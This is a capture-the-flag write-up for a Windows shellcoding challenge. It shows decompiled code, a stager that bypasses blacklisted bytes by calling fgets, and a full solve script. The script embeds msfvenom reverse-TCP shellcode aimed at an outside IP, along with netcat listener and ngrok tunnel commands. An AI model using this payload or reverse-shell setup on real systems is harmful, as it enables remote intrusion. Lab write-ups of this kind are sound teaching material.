# Pwn - Shellcoding
- Solved by: @Elma
- Flag: **-UNKNOWN-**

## Writeup

This is a windows shellcode challenge. If we analyze the program, we can see that it is a simple windows shellcode problem, with some blacklisted characters.

```c
__int64 sub_140001070()
{
  __int64 (__fastcall *v0)(__int64); // rsi
  unsigned __int64 v1; // rbx
  FILE *v2; // rax
  FILE *v3; // rax
  FILE *v4; // rax
  FILE *v5; // rax
  char v6; // cl
  __int64 result; // rax
  DWORD flOldProtect; // [rsp+2Ch] [rbp-4h] BYREF
  __int64 v9[4]; // [rsp+30h] [rbp+0h] BYREF

  sub_140001720();
  v9[0] = (unsigned __int64)v9 ^ unk_14000F050;
  v0 = off_14000F020;
  v1 = 0i64;
  v2 = (FILE *)off_14000F020(0i64);
  setvbuf(v2, 0i64, 4, 0i64);
  v3 = (FILE *)v0(1i64);
  setvbuf(v3, 0i64, 4, 0i64);
  v4 = (FILE *)v0(2i64);
  setvbuf(v4, 0i64, 4, 0i64);
  puts("Enter shellcode here:");
  v5 = (FILE *)v0(0i64);
  fgets(Address, 512, v5);
  do
  {
    if ( v1 > ~(unsigned __int64)Address )
    {
      exit(1);
    }
    v6 = Address[v1];
    if ( v6 == 0xE8 || v6 == 0x31 || v6 == 0xEB )
      Address[v1] = 0;
    ++v1;
  }
  while ( v1 != 512 );
  if ( VirtualProtect(Address, 0x200ui64, 0x40u, &flOldProtect) )
  {
    (*(void (**)(void))Address)();
    result = 0i64;
  }
  else
  {
    puts("An unexpected error has occured");
    result = 0xFFFFFFFFi64;
  }
  if ( unk_14000F050 != ((unsigned __int64)v9 ^ v9[0]) )
    sub_140002090();
  return result;
}
```

This is a summary of what happens

1. The program takes in input of 512 bytes into a buffer
2. The program checks for 0xE8, 0x31, 0xEB bytes, and nulls them
3. The program runs your input as shellcode

Typically for a windows shellcode challenge, we would use **msfvenom** to generate a shellcode that connects back to establish a reverse shell. Furthermore, **msfvenom** support shellcode encoders which will generate polymorphic shellcode in order to avoid a certain set of bad bytes that is provided by the user.

However, due to the program blocking the **jmp** opcode, msfvenom is unable to generate an encoded shellcode that will avoid the bytes. We can easily bypass this problem by writing a small shellcode that will call **fgets** to get another input that has less restrictions.

```py
stager_shellcode = asm("""
nop
lea rbx, [rip-0x8-53376]    # get the stdin file struct
mov rcx, 0
call rbx
mov r8, rax
mov rdx, 0x500
lea rcx, [rip+0x20-0x17]
lea rbx, [rip-0x8-14816-0x21]
call rbx                    # call fgets(buf, 0x500, stdin)
""")
```

With this small snippet, we can call for a second stage input. Afterwards, we will be able to generate a **msfvenom** shellcode using this following command

```sh
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=18.136.148.247 LPORT=16162 -f py -e x64/xor -b "\x0a\x1a\x0b"
# ...

$ nc -nlvp 4444 # listen on port 4444

# on a separate terminal
$ ngrok tcp 4444 # port forward 4444 through a ngrok tunnel
```

Here is the final solve script

```py
from pwintools import *
import sys
from keystone import *

ks = Ks(KS_ARCH_X86, KS_MODE_64)
p = Process("./shellcoding.exe")
log.info(f"pid @ {p.pid}")

sc_addr = 0x14000F060
fgets   = 0x14000B680
get_file = 0x140001FE0

print(fgets-sc_addr)

buf =  b"\x90"*5
buf += b"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d"
buf += b"\x05\xef\xff\xff\xff\x48\xbb\x79\xa5\x5f\x87\x9d"
buf += b"\x12\x9f\x7a\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
buf += b"\xff\xe2\xf4\x85\xed\xdc\x63\x6d\xfa\x5f\x7a\x79"
buf += b"\xa5\x1e\xd6\xdc\x42\xcd\x2b\x2f\xed\x6e\x55\xf8"
buf += b"\x5a\x14\x28\x19\xed\xd4\xd5\x85\x5a\x14\x28\x59"
buf += b"\xed\xd4\xf5\xcd\x5a\x90\xcd\x33\xef\x12\xb6\x54"
buf += b"\x5a\xae\xba\xd5\x99\x3e\xfb\x9f\x3e\xbf\x3b\xb8"
buf += b"\x6c\x52\xc6\x9c\xd3\x7d\x97\x2b\xe4\x0e\xcf\x16"
buf += b"\x40\xbf\xf1\x3b\x99\x17\x86\x4d\x99\x1f\xf2\x79"
buf += b"\xa5\x5f\xcf\x18\xd2\xeb\x1d\x31\xa4\x8f\xd7\x16"
buf += b"\x5a\x87\x3e\xf2\xe5\x7f\xce\x9c\xc2\x7c\x2c\x31"
buf += b"\x5a\x96\xc6\x16\x26\x17\x32\x78\x73\x12\xb6\x54"
buf += b"\x5a\xae\xba\xd5\xe4\x9e\x4e\x90\x53\x9e\xbb\x41"
buf += b"\x45\x2a\x76\xd1\x11\xd3\x5e\x71\xe0\x66\x56\xe8"
buf += b"\xca\xc7\x3e\xf2\xe5\x7b\xce\x9c\xc2\xf9\x3b\xf2"
buf += b"\xa9\x17\xc3\x16\x52\x83\x33\x78\x75\x1e\x0c\x99"
buf += b"\x9a\xd7\x7b\xa9\xe4\x07\xc6\xc5\x4c\xc6\x20\x38"
buf += b"\xfd\x1e\xde\xdc\x48\xd7\xf9\x95\x85\x1e\xd5\x62"
buf += b"\xf2\xc7\x3b\x20\xff\x17\x0c\x8f\xfb\xc8\x85\x86"
buf += b"\x5a\x02\xce\x23\x65\xec\x48\x26\x96\x6d\x87\x9d"
buf += b"\x53\xc9\x33\xf0\x43\x17\x06\x71\xb2\x9e\x7a\x79"
buf += b"\xec\xd6\x62\xd4\xae\x9d\x7a\x46\x87\x4d\x0f\x09"
buf += b"\xe5\xde\x2e\x30\x2c\xbb\xcb\x14\xe3\xde\xc0\x35"
buf += b"\xd2\x79\x80\x62\xc7\xd3\xf3\x93\xcd\x5e\x86\x9d"
buf += b"\x12\xc6\x3b\xc3\x8c\xdf\xec\x9d\xed\x4a\x2a\x29"
buf += b"\xe8\x6e\x4e\xd0\x23\x5f\x32\x86\x65\x17\x0e\x5f"
buf += b"\x5a\x60\xba\x31\x2c\x9e\xc6\x27\xf8\x90\xa5\x99"
buf += b"\x5a\x8a\xcf\x14\xd5\xf5\x6a\x38\xfd\x13\x0e\x7f"
buf += b"\x5a\x16\x83\x38\x1f\xc6\x22\xe9\x73\x60\xaf\x31"
buf += b"\x24\x9b\xc7\x9f\x12\x9f\x33\xc1\xc6\x32\xe3\x9d"
buf += b"\x12\x9f\x7a\x79\xe4\x0f\xc6\xcd\x5a\x16\x98\x2e"
buf += b"\xf2\x08\xca\xac\xd2\xf5\x77\x20\xe4\x0f\x65\x61"
buf += b"\x74\x58\x3e\x5d\xf1\x5e\x86\xd5\x9f\xdb\x5e\x61"
buf += b"\x63\x5f\xef\xd5\x9b\x79\x2c\x29\xe4\x0f\xc6\xcd"
buf += b"\x53\xcf\x33\x86\x65\x1e\xd7\xd4\xed\x57\x37\xf0"
buf += b"\x64\x13\x0e\x5c\x53\x25\x03\xb5\x9a\xd9\x78\x48"
buf += b"\x5a\xae\xa8\x31\x5a\x95\x0c\x93\x53\x25\x72\xfe"
buf += b"\xb8\x3f\x78\x48\xa9\x6f\xcf\xdb\xf3\x1e\x3d\x3b"
buf += b"\x87\x22\xe7\x86\x70\x17\x04\x59\x3a\xa3\x7c\x05"
buf += b"\xaf\xdf\x7c\x7d\x67\x9a\xc1\x3e\xb6\x2d\xe8\xf7"
buf += b"\x12\xc6\x3b\xf0\x7f\xa0\x52\x9d\x12\x9f\x7a"

sc = bytes(ks.asm("""
nop
lea rbx, [rip-0x8-53376]
mov rcx, 0
call rbx
mov r8, rax
mov rdx, 0x500
lea rcx, [rip+0x20-0x17]
lea rbx, [rip-0x8-14816-0x21]
call rbx
""")[0])
for i in sc:
    if i in [0xeb, 0xe8, 0x31]:
        print("BAD!")
print(sc)

input("press enter to continue")

p.sendline(sc)

input("press enter to continue")

p.sendline(buf)

p.interactive()
```
